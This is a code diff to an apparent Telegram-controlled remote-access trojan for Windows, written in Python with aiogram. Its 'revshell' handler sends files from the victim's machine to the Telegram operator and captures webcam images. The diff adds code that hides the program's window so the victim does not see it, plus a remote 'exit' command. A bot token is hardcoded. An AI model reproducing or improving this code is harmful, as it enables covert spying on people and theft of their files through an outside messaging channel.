@@ -5,6 +5,11 @@ from aiogram.utils import executor
 import subprocess
 import cv2
 from os import system
+import win32con
+import win32gui
+
+the_program_to_hide = win32gui.GetForegroundWindow()
+win32gui.ShowWindow(the_program_to_hide, win32con.SW_HIDE)
 
 bot = Bot('5831072627:AAHjv4fzJpeYHHUpFqumkw85pevyU3fqDec')
 dp = Dispatcher(bot)
@@ -19,6 +24,10 @@ async def revshell(message: types.Message):
                 data = (message.text.split())[i + 1]
                 photo = open(f'{data}', 'rb')
                 await bot.send_photo(message.from_user.id, photo)
+
+    elif 'exit' in message.text.split():
+        await bot.send_message(message.from_user.id, 'Бот успешно выключен!')
+        exit()
 
     elif 'photocam' in message.text.split():
         cam = cv2.VideoCapture(0)
